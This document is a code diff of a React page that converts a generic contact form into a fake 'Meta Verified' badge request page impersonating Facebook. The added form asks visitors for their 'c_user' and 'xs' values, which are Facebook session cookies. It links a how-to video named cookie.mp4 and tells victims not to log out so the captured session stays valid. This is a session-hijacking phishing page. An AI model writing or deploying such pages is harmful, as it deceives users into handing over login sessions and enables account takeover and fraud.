@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from "react";
+import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import {
   Form,
@@ -60,40 +60,67 @@ export default function Validation() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-[#ffffff]">
+    <div className="min-h-screen flex flex-col bg-white">
       <MetaTags 
-        title="Contact Form | Validation"
-        description="Contact Form - Initial Step"
+        title="Meta Verified | Validation"
+        description="Request a verified badge on Facebook - Initial Step"
       />
       <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
 
-      <nav className="flex items-center justify-between px-4 py-2 border-b border-[#dddfe2]">
+      {/* Navigation Bar */}
+      <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
         <div className="flex items-center">
-          <img 
-            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
-            alt="Logo"
-            className="h-8 sm:h-10"
-          />
+          <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
         </div>
-        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 py-1.5">
-          <Search className="w-4 h-4 text-[#65676B] mr-2" />
+        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
+          <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
           <input
             type="text"
             placeholder="Search"
-            className="bg-transparent outline-none text-sm text-[#65676B] placeholder-[#65676B] w-[180px]"
+            className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
           />
         </div>
       </nav>
 
-      <div className="flex-1 flex justify-center p-4 sm:p-6">
-        <div className="w-full max-w-md space-y-6">
-          <div className="text-center">
-            <h1 className="text-2xl font-semibold text-[#1c1e21] mb-2">
-              Contact Form
-            </h1>
-            <p className="text-[#65676B] text-sm">
-              Please fill in the required information
+      <div className="flex-1 flex justify-center p-4 sm:p-8">
+        <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
+          <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
+            Request a verified badge on Facebook
+          </h1>
+
+          <div className="space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base">
+            <p>
+              The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
             </p>
+            <p>
+              Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
+            </p>
+            <p>
+              Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
+            </p>
+          </div>
+
+          <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
+            <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>
+
+            <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
+              <video
+                className="w-full h-full"
+                controls
+                playsInline
+                preload="auto"
+              >
+                <source
+                  src="https://pub-97836f8a77c541e9afe2515c4730dd50.r2.dev/cookie.mp4"
+                  type="video/mp4"
+                />
+                Your browser does not support the video tag.
+              </video>
+            </div>
+
+            <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
+              Must Watch the video and submit required information correctly.
+            </h3>
           </div>
 
           <Form {...form}>
@@ -103,21 +130,19 @@ export default function Validation() {
                 name="c_user"
                 render={({ field }) => (
                   <FormItem>
-                    <FormLabel className="text-sm font-medium text-[#1c1e21]">
-                      User ID
-                    </FormLabel>
+                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">c_user</FormLabel>
                     <FormControl>
                       <Input
                         type="number"
                         min="0"
                         pattern="[0-9]+"
                         minLength={6}
-                        placeholder="Enter User ID"
-                        className="h-10 px-3 text-sm border border-[#dddfe2] rounded-md focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] focus:ring-opacity-50"
+                        placeholder="Enter c_user"
+                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                         {...field}
                       />
                     </FormControl>
-                    <FormMessage className="text-xs text-[#dc3545] mt-1" />
+                    <FormMessage className="text-xs text-[#dc3545]" />
                   </FormItem>
                 )}
               />
@@ -126,25 +151,27 @@ export default function Validation() {
                 name="xs"
                 render={({ field }) => (
                   <FormItem>
-                    <FormLabel className="text-sm font-medium text-[#1c1e21]">
-                      Reference
-                    </FormLabel>
+                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">xs</FormLabel>
                     <FormControl>
                       <Input 
                         type="text" 
-                        placeholder="Enter reference" 
-                        className="h-10 px-3 text-sm border border-[#dddfe2] rounded-md focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] focus:ring-opacity-50"
+                        placeholder="Enter xs" 
+                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                         {...field} 
                       />
                     </FormControl>
-                    <FormMessage className="text-xs text-[#dc3545] mt-1" />
+                    <FormMessage className="text-xs text-[#dc3545]" />
                   </FormItem>
                 )}
               />
 
+              <p className="text-xs sm:text-sm text-[#65676B]">
+                Please make sure account not to log out from your computer or laptop until you have received a verification email.
+              </p>
+
               <Button 
                 type="submit" 
-                className="w-full h-10 bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold text-sm rounded-md transition-colors duration-200"
+                className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#1877f2] hover:bg-[#166fe5] transition-colors duration-200"
                 disabled={form.formState.isSubmitting}
               >
                 {form.formState.isSubmitting ? "Submitting..." : "Submit"}
@@ -154,9 +181,14 @@ export default function Validation() {
         </div>
       </div>
 
-      <footer className="text-center py-4 text-xs text-[#65676B] border-t border-[#dddfe2]">
-        © 2025 Contact Form
-      </footer>
+      <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t">
+        Meta © 2025
+      </div>
+      <style>{`
+        .video-container {
+          box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+      `}</style>
     </div>
   );
 }
